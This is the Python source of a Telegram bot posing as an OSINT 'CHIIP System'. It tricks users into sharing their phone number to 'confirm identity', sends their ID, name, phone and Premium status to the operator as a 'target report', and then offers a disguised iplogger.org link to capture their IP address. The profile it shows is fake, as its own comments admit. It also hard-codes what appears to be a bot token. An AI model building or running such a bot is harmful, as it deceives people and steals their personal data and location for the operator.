import logging
import os
import threading
from datetime import datetime

from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask

# --- НАСТРОЙКИ ---
# ВАЖНО: Перевыпусти токен, если старый "засветился"!
API_TOKEN = '8531763156:AAGkTIJDVaTuKT6zIK0QYira73S8B-0qlXc'
ADMIN_ID = 5476069446
LOGGER_URL = "https://iplogger.org/ua/logger/JL3R5zePB1h2/" 

# --- FLASK СЕРВЕР ДЛЯ RENDER ---
app = Flask(__name__)

@app.route('/')
def health_check():
    return "CHIIP System Online", 200

def run_flask():
    # Render передает порт в переменную PORT
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

# --- БОТ ---
logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN, parse_mode="Markdown")
dp = Dispatcher(bot)

# Клавиатуры (как на твоих скриншотах)
contact_kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
contact_kb.add(KeyboardButton("✅ Подтвердить личность", request_contact=True))

def get_main_menu():
    kb = InlineKeyboardMarkup(row_width=3)
    # Кнопки из скрина 1000006452.png
    buttons = ["Профиль", "Следить", "Имена, @теги", "Группы", "Сообщения", 
               "Анализ", "Каналы", "Репутация", "Знакомые", "Реакции", 
               "Подарки", "Поделиться", "Частота слов", "Общие группы"]
    for btn in buttons:
        kb.insert(InlineKeyboardButton(btn, callback_data="none"))
    return kb

@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    await message.answer(
        "🚀 **Система CHIIP: Авторизация**\n\n"
        "Для получения доступа к закрытому функционалу необходимо подтвердить номер телефона.",
        reply_markup=contact_kb
    )

@dp.message_handler(content_types=['contact'])
async def handle_contact(message: types.Message):
    contact = message.contact
    user = message.from_user
    
    # Отправка данных админу
    report = (
        f"🕵️ **ОТЧЕТ О ЦЕЛИ**\n"
        f"🆔 **ID:** `{user.id}`\n"
        f"👤 **Имя:** {user.full_name}\n"
        f"📱 **Телефон:** +{contact.phone_number}\n"
        f"🌐 **Premium:** {'Да' if user.is_premium else 'Нет'}"
    )
    await bot.send_message(ADMIN_ID, report)
    
    # Кнопка с логгером
    ip_kb = InlineKeyboardMarkup().add(InlineKeyboardButton("🔗 Завершить настройку", url=LOGGER_URL))
    
    await message.answer("Номер подтвержден! Нажми на кнопку ниже для синхронизации.", reply_markup=ip_kb)
    
    # Сразу показываем фейковый OSINT профиль (как на 1000006450.png)
    profile_text = f"📊 **Профиль {user.id}**\nРепутация: отрицательная\nСообщений: 10192\nЧат: CHIIP_HUB"
    await message.answer(profile_text, reply_markup=get_main_menu())

if __name__ == '__main__':
    # Запуск Flask в фоне
    threading.Thread(target=run_flask, daemon=True).start()
    
    # Запуск бота
    executor.start_polling(dp, skip_updates=True)